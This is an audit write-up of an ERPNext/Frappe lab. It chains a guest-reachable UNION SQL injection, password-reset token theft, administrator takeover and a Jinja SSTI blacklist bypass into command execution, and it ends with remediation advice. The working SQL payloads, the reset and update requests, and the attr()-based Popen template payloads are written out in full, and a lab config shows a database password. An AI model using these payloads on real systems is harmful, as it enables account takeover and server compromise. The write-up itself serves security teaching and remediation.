This article documents a white-box audit of an ERPNext / Frappe Framework lab build. The chain combines an unauthenticated MariaDB UNION SQL injection, disclosure of a password-reset token, administrator account takeover, and a Jinja server-side template injection filter bypass. No single bug directly provides unauthenticated RCE; the final impact comes from several failed security boundaries working together.


# Vulnerability Overview

- Product: ERPNext / Frappe Framework (the original lab notes do not identify an exact version)
- Stack: Python, Frappe, Jinja, and MariaDB
- Database observed in the lab: `10.2.24-MariaDB`
- Vulnerability 1: unauthenticated MariaDB UNION SQL injection
- Vulnerability 2: administrator takeover through password-reset token disclosure
- Vulnerability 3: Jinja SSTI blacklist bypass
- SQL injection entry point: `frappe.utils.global_search.web_search`
- Vulnerable parameters: `scope`; `limit` and `start` are also inserted without safe parameter binding
- SQL injection authentication: none, because the function uses `@frappe.whitelist(allow_guest=True)`
- SSTI entry point: the `subject` and `response` fields of an Email Template
- Template renderer: `frappe.render_template()`
- SSTI authentication: permission to create, modify, and render an Email Template; this chain obtains that permission by taking over an administrator account
- Final impact: unauthenticated SQL injection -> reset-token theft -> administrator takeover -> malicious template creation -> Jinja filter bypass -> command execution as the `frappe` service account

```text
Guest-accessible whitelisted method
    ↓
scope reaches string-formatted SQL
    ↓
UNION query reads authentication data
    ↓
Password-reset token is stolen
    ↓
Administrator account takeover
    ↓
Attacker creates and renders an Email Template
    ↓
Jinja blacklist bypass
    ↓
subprocess.Popen
    ↓
RCE
```

The phrase “authentication bypass” is used here in the broad sense. The chain does not skip password verification inside the login handler; it uses an unauthenticated SQL injection to read a password-reset token and then takes over the administrator account through the legitimate reset workflow.


# Audit Preparation and Attack-Surface Mapping

The audit uses four complementary techniques:

- Source review to enumerate `@frappe.whitelist(allow_guest=True)` methods.
- VS Code remote debugging to follow requests through the Python/Frappe process.
- Burp Suite to capture, modify, and replay Frappe API requests.
- MariaDB General Log to confirm the exact SQL executed by the database.

Important source paths:

```text
apps/frappe/frappe/__init__.py
apps/frappe/frappe/handler.py
apps/frappe/frappe/utils/global_search.py
apps/frappe/frappe/database/database.py
apps/frappe/frappe/core/doctype/user/user.py
apps/frappe/frappe/email/doctype/email_template/email_template.py
apps/frappe/frappe/utils/jinja.py
```

## SMTP Debugging in the Lab

The SQL injection can read data but cannot directly run an `UPDATE` statement in this setup. Account takeover therefore uses Frappe's normal password-reset flow and then reads the newly generated token from the database. An SMTP debugging server helps explain and observe that workflow, although it is not required for the final exploit chain.

The site configuration can point its mail server at the testing host:

```json
{
  "db_name": "_1bd3e0294da19198",
  "db_password": "32ldabYvxQanK4jj",
  "db_type": "mariadb",
  "mail_server": "192.168.45.168",
  "use_ssl": 0,
  "mail_port": 25,
  "auto_email_id": "admin@randomdomain.com"
}
```

Start a local SMTP sink with `aiosmtpd`:

```bash
pipx install aiosmtpd
aiosmtpd -n -l 0.0.0.0:25
```

The SMTP service is only a lab aid. The exploit path reads `reset_password_key` directly through SQL injection.

## How Frappe Exposes Python Methods over HTTP

Frappe uses the `whitelist` decorator to expose Python functions as HTTP methods:

```python
@frappe.whitelist()
def myfunc(param1, param2):
    pass
```

A typical endpoint is:

```http
POST /api/method/path.to.module.function
```

The lab version also accepts a `cmd` parameter at the application root:

```http
POST /
Content-Type: application/x-www-form-urlencoded

cmd=path.to.module.function&param1=value
```

The decorator records ordinary methods and guest-accessible methods separately:

```python
whitelisted = []
guest_methods = []
xss_safe_methods = []

def whitelist(allow_guest=False, xss_safe=False):
    def innerfn(fn):
        whitelisted.append(fn)

        if allow_guest:
            guest_methods.append(fn)

            if xss_safe:
                xss_safe_methods.append(fn)

        return fn

    return innerfn
```

`handler.py` reads `cmd`, resolves the Python function, verifies that it is whitelisted, and forwards request parameters:

```python
def execute_cmd(cmd, from_async=False):
    method = get_attr(cmd)
    is_whitelisted(method)
    return frappe.call(method, **frappe.form_dict)
```

Guest requests receive an additional check:

```python
def is_whitelisted(method):
    if frappe.session['user'] == 'Guest':
        if method not in frappe.guest_methods:
            raise frappe.PermissionError(
                'Not Allowed, {0}'.format(method)
            )
```

This makes the following search pattern one of the most valuable starting points in a Frappe audit:

```text
@frappe.whitelist(allow_guest=True)
```

The browser traffic demonstrates that front-end code calls Python methods by module path.

![[Pasted image 20260711191439.png]]

The path maps directly to the corresponding source module.

![[Pasted image 20260711191551.png]]

## Remote Debugging

Remote debugging is used to confirm how `cmd` reaches `handler.py`, how `scope` enters SQL, and how Email Template content reaches `render_template()`.

The lab installs a debugger inside the Frappe virtual environment and modifies the web-process entry point to wait for the IDE:

```python
import ptvsd

ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger")
ptvsd.wait_for_attach()
```

![[Pasted image 20260711182149.png]]

Synchronize the server source tree to the analysis host and open it in VS Code.

![[Pasted image 20260711174015.png]]

![[Pasted image 20260711175955.png]]

Start the web process without automatic reload or threading so breakpoints remain attached to the process handling the request:

```bash
../env/bin/python ../apps/frappe/frappe/utils/bench_helper.py \
    frappe serve --port 8000 --noreload --nothreading
```

Open the modified Python source and create a remote-attach configuration.

![[Pasted image 20260711180802.png]]

![[Pasted image 20260711180810.png]]

![[Pasted image 20260711180930.png]]

![[Pasted image 20260711181355.png]]

![[Pasted image 20260711181402.png]]

The path mapping must align the local source tree with `/home/frappe/frappe-bench` on the server:

```json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Python Debugger: Remote Attach",
      "type": "debugpy",
      "request": "attach",
      "connect": {
        "host": "192.168.139.123",
        "port": 5678
      },
      "pathMappings": [
        {
          "localRoot": "${workspaceFolder}",
          "remoteRoot": "/home/frappe/frappe-bench"
        }
      ]
    }
  ]
}
```

Connect the debugger, set a breakpoint in `handler.py`, and request the ERPNext application.

![[Pasted image 20260711181750.png]]

![[Pasted image 20260711181817.png]]

![[Pasted image 20260711181824.png]]

![[Pasted image 20260711181830.png]]

Modern environments normally use `debugpy`. A debugging socket should listen only on a loopback address and be reached through SSH forwarding; exposing it publicly creates another critical attack surface.

## MariaDB Query Logging

The General Log confirms the exact query that reaches MariaDB:

```ini
[mysqld]
general_log_file = /var/log/mysql/mysql.log
general_log = 1
```

After restarting MariaDB, observe activity with:

```bash
sudo tail -f /var/log/mysql/mysql.log
```

If the service fails because of hostname resolution, verify `/etc/hosts`.

![[Pasted image 20260713141556.png]]

A working log shows database connections and executed statements.

![[Pasted image 20260713144140.png]]

The debugger explains data flow inside the application; the database log proves the final SQL. Using both avoids relying on assumptions about string construction.

## Architecture and Audit Strategy

Understanding the framework architecture narrows the review surface.

![[Pasted image 20260711184812.png]]

In a conventional MVC model, controllers receive HTTP input, models represent business data, and views render output. The usual flow is:

```text
User interacts with a view
    ↓
HTTP request reaches a controller
    ↓
Controller reads or modifies a model
    ↓
Model returns data
    ↓
Controller renders a response
```

![[Pasted image 20260711185124.png]]

Frappe is organized around DocTypes rather than a strict traditional MVC split. A DocType combines a database table, business object, form view, permissions, and controller logic.

![[Pasted image 20260711185744.png]]

The UI exposes DocType metadata and field definitions.

![[Pasted image 20260711185809.png]]

![[Pasted image 20260711185822.png]]

The same definitions can be audited as JSON in the source tree.

![[Pasted image 20260711185851.png]]

Related Python controllers implement custom behavior and may expose whitelisted methods.

![[Pasted image 20260711190035.png]]

For each DocType, inspect the JSON metadata, Python controller, permissions, whitelisted methods, direct SQL, and any path into template, file, or process execution.

The resulting audit strategy is:

```text
Enumerate @frappe.whitelist(allow_guest=True)
    ↓
Treat each function as an unauthenticated controller entry point
    ↓
Search for raw SQL, template rendering, file, and process operations
    ↓
Trace request parameters to dangerous sinks
    ↓
Validate with breakpoints and database logging
```

The lab exposed 91 guest methods, a small enough set to review systematically. Searching them for database operations led to `web_search()` in `global_search.py`.

![[Pasted image 20260711200452.png]]


# SQL Injection Discovery

## Locating SQL in a Guest Method

The vulnerable method is guest-accessible:

```python
@frappe.whitelist(allow_guest=True)
def web_search(text, scope=None, start=0, limit=20):
    results = []
    texts = text.split('&')

    for text in texts:
        common_query = ''' SELECT `doctype`, `name`, `content`, `title`, `route`
                FROM `__global_search`
                WHERE {conditions}
                LIMIT {limit} OFFSET {start}'''

        scope_condition = (
            '`route` like "{}%" AND '.format(scope)
            if scope else ''
        )
        published_condition = '`published` = 1 AND '
        mariadb_conditions = postgres_conditions = ' '.join(
            [published_condition, scope_condition]
        )

        text = '"{}"'.format(text)
        mariadb_conditions += (
            'MATCH(`content`) AGAINST ({} IN BOOLEAN MODE)'
        ).format(frappe.db.escape(text))

        result = frappe.db.multisql({
            'mariadb': common_query.format(
                conditions=mariadb_conditions,
                limit=limit,
                start=start
            )
        }, as_dict=True)
```

![[Pasted image 20260711200731.png]]

## Confirming the Call Chain

Burp captures the request while breakpoints confirm the route through Frappe.

![[Pasted image 20260711201106.png]]

![[Pasted image 20260711201131.png]]

The `cmd` value resolves to the target Python function.

![[Pasted image 20260711201152.png]]

The debugger shows request parameters entering the function.

![[Pasted image 20260711201213.png]]

![[Pasted image 20260711201229.png]]

Following execution reaches the query-construction logic and the database call.

![[Pasted image 20260711201342.png]]

![[Pasted image 20260711201411.png]]

![[Pasted image 20260711201433.png]]

![[Pasted image 20260711201453.png]]

## Taint Flow

The four HTTP parameters receive inconsistent treatment:

```text
text   -> frappe.db.escape(text) -> SQL
scope  -> str.format(scope)      -> SQL
limit  -> str.format(limit)      -> SQL
start  -> str.format(start)      -> SQL
```

`text` is escaped, but `scope`, `limit`, and `start` enter the query through string formatting. For `scope`, attacker input appears inside a double-quoted `LIKE` string:

```python
scope_condition = '`route` like "{}%" AND '.format(scope)
```

An attacker can close the double quote, append SQL, and use MariaDB's `#` comment syntax to discard the remainder of the original query.

```text
HTTP scope parameter
    ↓
frappe.local.form_dict
    ↓
frappe.call(web_search, **form_dict)
    ↓
scope_condition.format(scope)
    ↓
mariadb_conditions
    ↓
common_query.format(...)
    ↓
frappe.db.multisql()
    ↓
PyMySQL execute()
    ↓
MariaDB
```

## Reconstructing the Normal Query

A normal request produces a query similar to:

```sql
SELECT `doctype`, `name`, `content`, `title`, `route`
FROM `__global_search`
WHERE `published` = 1
  AND `route` LIKE "offsec_scope%"
  AND MATCH(`content`) AGAINST ('\"offsec\"' IN BOOLEAN MODE)
LIMIT 20 OFFSET 0;
```

The General Log confirms the generated statement.

![[Pasted image 20260711201554.png]]

## UNION Injection Validation

The original query returns five columns, so the UNION branch must also return five:

```sql
offsec_scope" UNION ALL SELECT 1,2,3,4,5#
```

URL-encoded request value:

```http
scope=offsec_scope%22%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%23
```

Burp shows the injected request and reflected values.

![[Pasted image 20260711201724.png]]

![[Pasted image 20260711201808.png]]

The response fields map to the UNION columns as follows:

```json
{
  "doctype": "1",
  "name": "2",
  "content": "3",
  "title": "4",
  "route": "5"
}
```

The debugger and database log confirm that the supplied syntax reaches MariaDB.

![[Pasted image 20260711203607.png]]

![[Pasted image 20260711205218.png]]

![[Pasted image 20260711205251.png]]

![[Pasted image 20260711205317.png]]

Replace the fifth column with `@@version`:

```sql
offsec_scope" UNION ALL SELECT 1,2,3,4,@@version#
```

![[Pasted image 20260711213847.png]]

The lab returns `10.2.24-MariaDB-10.2.24+maria~xenial-log`.

![[Pasted image 20260711213933.png]]

PyMySQL does not enable multiple statements in this code path, so a simple stacked `UPDATE` is unavailable. That limitation does not make the issue low impact: reflected UNION injection can still disclose credentials, tokens, configuration, and other sensitive data.


# From SQL Injection to Administrator Takeover

The next stage turns read access into control of a privileged account.

![[Pasted image 20260712041925.png]]

## Resolving UNION Collation Conflicts

Reading `__Auth.name` directly can produce an `Illegal mix of collations for operation 'UNION'` error.

![[Pasted image 20260712042217.png]]

Query the collation of the corresponding output column in `__global_search`:

```sql
offsec_scope" UNION ALL
SELECT 1,2,3,4,COLLATION_NAME
FROM information_schema.columns
WHERE TABLE_NAME="__global_search"
  AND COLUMN_NAME="name"#
```

![[Pasted image 20260712044952.png]]

The lab reports `utf8mb4_general_ci`.

![[Pasted image 20260712042458.png]]

Apply that collation explicitly to sensitive text fields:

```sql
name COLLATE utf8mb4_general_ci
```

![[Pasted image 20260712042617.png]]

Automation should discover this value dynamically rather than hard-code a collation that may differ between installations.

## Extracting the Administrator Account

The `__Auth` table contains authentication entries. Return its `name` field through the fifth UNION column:

```sql
offsec_scope" UNION ALL
SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci
FROM __Auth#
```

![[Pasted image 20260712043011.png]]

In a real assessment, do not assume that any address matching a simple email regex is an administrator. Correlate the account with role and enabled-state data in `tabUser`.

## Triggering Password Reset

Call the password-reset method for the selected privileged account:

```http
POST /
Content-Type: application/x-www-form-urlencoded

cmd=frappe.core.doctype.user.user.reset_password&user=administrator@example.com
```

![[Pasted image 20260712043036.png]]

The implementation generates a random token and stores it in `tabUser.reset_password_key`:

```python
def reset_password(self, send_email=False, password_expired=False):
    from frappe.utils import random_string, get_url

    key = random_string(32)
    self.db_set("reset_password_key", key)

    url = "/update-password?key=" + key
    link = get_url(url)

    if send_email:
        self.password_reset_mail(link)

    return link
```

![[Pasted image 20260712043051.png]]

Normally, only the mailbox owner receives this secret. SQL injection breaks that confidentiality boundary.

## Extracting reset_password_key

If the column name is unknown, enumerate `tabUser` through `information_schema.columns`.

![[Pasted image 20260712043130.png]]

Then return the account and reset token in known response fields:

```sql
offsec_scope" UNION ALL
SELECT
    name COLLATE utf8mb4_general_ci,
    2,
    3,
    4,
    reset_password_key COLLATE utf8mb4_general_ci
FROM tabUser
WHERE name="administrator@example.com"#
```

![[Pasted image 20260712043252.png]]

![[Pasted image 20260712043320.png]]

Filtering by account reduces response noise and prevents automation from selecting another user's token.

## Setting a New Password

First request the reset page to verify the token:

```http
GET /update-password?key=<RESET_TOKEN>
```

![[Pasted image 20260712043408.png]]

Then submit the new password:

```http
POST /
Content-Type: application/x-www-form-urlencoded

cmd=frappe.core.doctype.user.user.update_password&
key=<RESET_TOKEN>&
old_password=&
new_password=<NEW_PASSWORD>&
logout_all_session=1
```

![[Pasted image 20260712043414.png]]

The attacker can now authenticate with the administrator email and the chosen password.

```text
Guest request
    ↓
web_search scope UNION injection
    ↓
Discover output-column collation
    ↓
Read administrator account
    ↓
Trigger reset_password()
    ↓
Read tabUser.reset_password_key
    ↓
Submit /update-password
    ↓
Administrator account takeover
```


# SSTI Discovery

## Email Template Rendering

An administrator can create an Email Template. A simple arithmetic probe in the subject or response confirms whether user-controlled content is evaluated by Jinja:

```jinja2
{{ 7 * 7 }}
```

The UI workflow for creating and selecting a template is shown below.

![[Pasted image 20260712063615.png]]

![[Pasted image 20260712063628.png]]

![[Pasted image 20260712063643.png]]

Rendering the template produces `49`.

![[Pasted image 20260712063720.png]]

![[Pasted image 20260712063731.png]]

The API responsible for retrieving and rendering a template is:

```http
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template
Content-Type: application/x-www-form-urlencoded

template_name=<TEMPLATE_NAME>&doc={}
```

![[Pasted image 20260712063739.png]]

The source retrieves the document and renders both fields:

```python
@frappe.whitelist()
def get_email_template(template_name, doc):
    if isinstance(doc, string_types):
        doc = json.loads(doc)

    email_template = frappe.get_doc(
        "Email Template",
        template_name
    )

    return {
        "subject": frappe.render_template(
            email_template.subject,
            doc
        ),
        "message": frappe.render_template(
            email_template.response,
            doc
        )
    }
```

![[Pasted image 20260712063803.png]]

![[Pasted image 20260712063825.png]]

Taint flow:

```text
Email Template subject / response
    ↓
frappe.get_doc("Email Template", template_name)
    ↓
frappe.render_template(template, doc)
    ↓
Jinja from_string(template).render(context)
```

## Weak Blacklist

The lab version of `frappe.render_template()` attempts to reject common Jinja object traversal with one substring check:

```python
def render_template(template, context, is_path=None, safe_render=True):
    if not template:
        return ""

    if (
        is_path
        or template.startswith("templates/")
        or (template.endswith('.html') and '\n' not in template)
    ):
        return get_jenv().get_template(template).render(context)
    else:
        if safe_render and ".__" in template:
            throw("Illegal template")

        return get_jenv().from_string(template).render(context)
```

![[Pasted image 20260712063858.png]]

A direct payload such as `{{ ''.__class__.__mro__ }}` is rejected.

![[Pasted image 20260712063905.png]]

![[Pasted image 20260712064035.png]]

The design flaw is allowing an untrusted user to control a complete Jinja template and then trying to constrain the language with a string blacklist. Jinja supports equivalent property access through the `attr` filter:

```jinja2
object|attr("__class__")
```

This expression has the same meaning as `object.__class__` but does not contain the blocked `.__` substring.


# SSTI Filter Bypass and Command Execution

## Bypassing the `.__` Check with attr

Store sensitive attribute names in variables and resolve them with `attr`:

```jinja2
{% set string = "ssti" %}
{% set class = "__class__" %}
{{ string|attr(class) }}
```

The rendered result is `<class 'str'>`.

![[Pasted image 20260712072738.png]]

![[Pasted image 20260712072746.png]]

## Walking from str to object

Use `__mro__` to obtain the inheritance chain:

```jinja2
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{{ mro_r }}
```

![[Pasted image 20260712073829.png]]

![[Pasted image 20260712073848.png]]

The length of the MRO differs between Python versions, so fixed indices are fragile. `object` is always the final element:

```jinja2
{% set object_class = mro_r[-1] %}
{{ object_class }}
```

![[Pasted image 20260712073923.png]]

![[Pasted image 20260712074013.png]]

## Enumerating object.__subclasses__()

Resolve and call `__subclasses__` through `attr`:

```jinja2
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[-1]|attr(subclasses)() %}
{{ subclasses_r }}
```

![[Pasted image 20260712074306.png]]

![[Pasted image 20260712074343.png]]

## Finding subprocess.Popen Dynamically

Class indices depend on Python version, import order, and runtime state. Do not hard-code lab values such as `420`:

```jinja2
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[-1]|attr(subclasses)() %}

{% for item in subclasses_r %}
{% if "subprocess.Popen" in item|string %}
PopenIndex:{{ loop.index0 }}
{% endif %}
{% endfor %}
```

![[Pasted image 20260712074423.png]]

If the process has not imported `subprocess`, that class may be absent and another runtime primitive must be identified.

## Non-Destructive RCE Validation

After finding the index, use a non-destructive command in an authorized lab:

```jinja2
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[-1]|attr(subclasses)() %}

{{ subclasses_r[POPEN_INDEX]([
    "/usr/bin/touch",
    "/tmp/erpnext-ssti-poc"
]) }}
```

Verify the file on the lab host:

```bash
ls -l /tmp/erpnext-ssti-poc
```

![[Pasted image 20260712182102.png]]

The file owner demonstrates that the template executes commands as the Frappe service account. Real assessments should use an agreed validation method and avoid persistence or business impact.

## Creating and Triggering the Template through the API

Create the template through Frappe's document-save API:

```http
POST /api/method/frappe.desk.form.save.savedocs
Content-Type: application/x-www-form-urlencoded
Cookie: <AUTHENTICATED_SESSION>

doc=<URL_ENCODED_EMAIL_TEMPLATE_JSON>&action=Save
```

Example document:

```json
{
  "doctype": "Email Template",
  "__islocal": 1,
  "__unsaved": 1,
  "__newname": "SSTI Audit Template",
  "subject": "SSTI Audit Template",
  "response": "{{ 7 * 7 }}"
}
```

Render it through `get_email_template`:

```http
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template
Content-Type: application/x-www-form-urlencoded
Cookie: <AUTHENTICATED_SESSION>

template_name=SSTI+Audit+Template&doc={}
```

This case uses an administrator session. When evaluating SSTI independently, review which lower-privileged roles can create, modify, preview, or render Email Templates.


# Automation Logic

The lab automation follows this state machine:

```text
1. Call the web_search injection point
2. Query the collation of __global_search.name
3. Identify the administrator through __Auth / tabUser
4. Trigger reset_password to create a fresh token
5. Extract tabUser.reset_password_key
6. Call update_password with a chosen password
7. Log in and save an Email Template
8. Render a probe template and find the Popen index dynamically
9. Update the template with a non-destructive command payload
10. Render again and verify command execution
```

Reliable automation should use `requests.Session()`, parse JSON structurally, discover the collation and `Popen` index dynamically, filter tokens by the target account, set network timeouts, validate every response, and stop immediately when a prerequisite fails.

The complete lab script in the Chinese source follows those rules and defaults to a `touch` command for non-destructive validation. It should only be run in an explicitly authorized lab environment.


# Final Exploit Chain

```text
Unauthenticated attacker
    ↓
Enumerate @frappe.whitelist(allow_guest=True)
    ↓
Locate frappe.utils.global_search.web_search
    ↓
Control the scope parameter
    ↓
Close the LIKE string and inject UNION SELECT
    ↓
Read the relevant collation from information_schema
    ↓
Use COLLATE to resolve UNION charset conflicts
    ↓
Read administrator account data from __Auth / tabUser
    ↓
Call reset_password to generate a one-time token
    ↓
Read tabUser.reset_password_key through SQL injection
    ↓
Call update_password with an attacker-controlled password
    ↓
Log in as administrator
    ↓
Create a malicious Email Template
    ↓
get_email_template()
    ↓
frappe.render_template()
    ↓
Fixed-string blacklist checks for ".__"
    ↓
Equivalent property access through Jinja attr()
    ↓
__class__
    ↓
__mro__
    ↓
object.__subclasses__()
    ↓
subprocess.Popen
    ↓
Command execution as the Frappe service account
```


# Remediation

## Parameterize Every SQL Value

Do not construct conditions with string formatting:

```python
scope_condition = '`route` like "{}%" AND '.format(scope)
```

Use database parameter binding or the Frappe Query Builder:

```python
conditions.append("`route` LIKE %(scope)s")
values["scope"] = scope + "%"

frappe.db.sql(query, values=values, as_dict=True)
```

Convert pagination values to integers and enforce limits:

```python
start = max(0, int(start))
limit = min(max(1, int(limit)), 100)
```

Escaping is not equivalent to parameterization. Keep all controllable values separate from SQL structure.

## Reduce the Guest API Surface

Remove `allow_guest=True` when public access is unnecessary. If search must remain public, expose a purpose-built minimal query with strict field, scope, pagination, rate, and response-size limits. Authentication reduces reachability but does not replace parameterized SQL.

## Harden Password-Reset Tokens

Reset tokens should be generated with a cryptographically secure source, expire quickly, work once, be bound to a user and purpose, invalidate older tokens, revoke sessions after reset, and be rate-limited and audited. Store only a token digest in the database so a read-only disclosure cannot immediately replay the secret.

## Do Not Accept Arbitrary Untrusted Jinja Templates

The safest design supports only fixed placeholders such as:

```text
{{ customer_name }}
{{ order_id }}
{{ reset_link }}
```

Map those placeholders to plain data. Do not expose arbitrary Python objects, functions, modules, or a complete template language to untrusted users.

## Use a Real Restricted Template Environment

A blacklist such as:

```python
if ".__" in template:
    reject()
```

cannot cover `attr()`, item access, filter composition, or other equivalent syntax. If expressions are required, use a strict sandbox with a minimal context and positive allowlists for attributes, filters, tests, globals, and callables. Explicitly block dangerous object-graph traversal, including `__class__`, `__mro__`, `__bases__`, `__subclasses__`, and arbitrary `attr` access.

## Separate Email Template Permissions

Grant template creation, editing, preview/rendering, sending, and system-template administration independently. Ordinary business users should not receive system-template editing rights. Log template changes and consider approval for privileged templates.

## Apply Least Privilege and Network Isolation

The web database user should have only the permissions needed for normal application behavior. Avoid DBA accounts, restrict sensitive metadata and authentication tables where possible, block database file operations, limit outbound network access, and prevent the service account from launching unnecessary programs.

## Upgrade and Regression-Test

Upgrade to an officially fixed ERPNext/Frappe release and verify:

```text
web_search() no longer formats scope, limit, or start into SQL
Guest users cannot reach unnecessary database-query methods
reset_password_key is not stored in directly replayable form
render_template() does not rely on a ".__" blacklist
Email Templates cannot reach a dangerous Python object graph
Low-privileged roles cannot create and render system templates
```

Because the original lab notes do not identify an exact ERPNext/Frappe version, this case study must not be treated as evidence that every current release is vulnerable. Validate the target version against its source and official security advisories.


# Audit Takeaways

The most reusable lessons from this case are:

1. In Frappe, begin by enumerating `@frappe.whitelist(allow_guest=True)`.
2. Trace each exposed controller into ORM, raw SQL, template rendering, file, and process operations.
3. Review every parameter independently; one function may handle similar parameters with different security controls.
4. Use a debugger to reconstruct variables and database logging to confirm final SQL.
5. After finding read-only SQL injection, look for tokens, sessions, API keys, and password-reset chains.
6. When a defense is a string blacklist, search for equivalent language syntax rather than only alternate characters.
7. Python and Jinja class indices depend on runtime state, so enumerate dynamically.
8. Evaluate each bug as part of a complete privilege chain rather than assigning severity in isolation.

```text
SQL string construction in a public API
    +
Directly replayable password-reset tokens
    +
Privileged user-controlled Jinja templates
    +
Bypassable string blacklist
    =
Unauthenticated attacker reaches server-side command execution
```
